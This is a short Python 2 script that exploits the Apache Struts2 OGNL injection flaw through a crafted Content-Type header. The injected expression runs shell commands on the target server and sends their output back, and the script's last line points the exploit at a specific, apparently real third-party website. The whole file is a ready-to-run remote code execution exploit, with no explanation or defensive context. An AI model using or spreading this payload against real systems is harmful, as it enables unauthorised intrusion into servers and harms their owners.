#! /usr/bin/env python
# encoding:utf-8
import urllib2,uuid
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

def exploit(target):
    url = target
    #print "测试URl " + str(url)
    register_openers()
    id = str(uuid.uuid1())
    cmd = "echo " + id
    datagen, header = multipart_encode({"image1": "ipconfig"})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]='''%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd='''+cmd+''').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}'''
    try:
        request = urllib2.Request(url,datagen,headers=header)
        response = urllib2.urlopen(request)
        html = response.read()
        if id in response.read():
            return True,id
        else:
            return False,None
    except:
        print "访问失败"
        pass

status,keyword = exploit("http://www.vhomework.com/login.action?lasturl=/view/s/bk_info.vm")
print keyword